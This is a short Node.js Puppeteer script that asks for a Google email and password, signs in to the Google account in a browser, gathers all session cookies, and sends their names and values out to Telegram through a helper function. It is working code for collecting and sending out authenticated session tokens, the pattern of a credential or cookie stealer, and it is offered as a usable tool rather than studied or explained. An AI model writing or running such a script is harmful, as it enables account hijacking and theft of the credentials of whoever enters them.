// google_auto.js
const puppeteer = require('puppeteer');
const { sendTelegramMessage, prompt } = require('./utils');

async function main() {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  // Prompt for credentials
  const email = await prompt('Google Email: ');
  const password = await prompt('Google Password: ');

  try {
    await page.goto('https://accounts.google.com/signin', { waitUntil: 'networkidle2' });
    await page.waitForSelector('input[type="email"]');
    await page.type('input[type="email"]', email, { delay: 50 });
    await page.click('#identifierNext');
    await page.waitForTimeout(2000);
    await page.waitForSelector('input[type="password"]', { visible: true });
    await page.type('input[type="password"]', password, { delay: 50 });
    await page.click('#passwordNext');

    // Wait for login to complete
    await page.waitForNavigation({ waitUntil: 'networkidle2' });
    const cookies = await page.cookies();

    let msg = '*Google Cookies:*\n';
    if (cookies.length === 0) msg += 'No cookies found.';
    else cookies.forEach(c => { msg += `${c.name} = ${c.value}\n`; });
    await sendTelegramMessage(msg);
  } catch (err) {
    await sendTelegramMessage(`Google login failed: ${err.message}`);
  }

  await browser.close();
}

main();